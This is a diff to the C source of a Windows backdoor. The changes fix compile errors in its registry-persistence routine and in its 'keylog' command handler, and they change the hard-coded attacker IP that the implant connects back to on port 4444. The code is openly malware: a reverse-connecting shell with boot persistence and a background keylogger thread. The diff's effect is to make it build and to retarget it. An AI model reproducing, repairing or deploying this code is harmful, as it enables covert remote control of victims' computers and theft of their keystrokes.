@@ -67,7 +67,7 @@ int bootRun()
   DWORD pathLenInBytes = pathLen * sizeof(*szPath);
 
   //Value setting
-  if(RegSetValueEx(NewVal, TEXT("Exploited"), 0, REG_SZ, (LPBYTES)szPath, pathLenInBytes) != ERROR_SUCCESS)
+  if(RegSetValueEx(NewVal, TEXT("Exploited"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
   {
     //if value is setted want to close the key. and notify to socket.
     RegCloseKey(NewVal);
@@ -186,10 +186,11 @@ void shell()
         //the bootRun function allows us to make persistance the backdoor when target rebooted.
         bootRun();
       }
-      else if (strncmp("keylog"), buffer, 6) == 0)
+      else if (strncmp("keylog", buffer, 6) == 0)
       {
         //this process want to execute in the background 
         //need to specify a thread to do that.
+        //Handle will create a thread of a process.
         HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);//Function Name in the keylog.
         goto jump;
       }      
@@ -252,7 +253,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     char *ServIP; //which point the memory address of the particular variable.
     WSADATA wsaData;//WSADATA is structure which consist with the windows socket informations.
 
-    ServIP = "10.0.3.150";//here must want to apply the attacker machine IP.
+    ServIP = "192.168.1.52";//here must want to apply the attacker machine IP.
     ServPort = 4444; //Make sure another process is not using same port.
 
     //WSAStartup is initiate a process of winsock dll by a process.
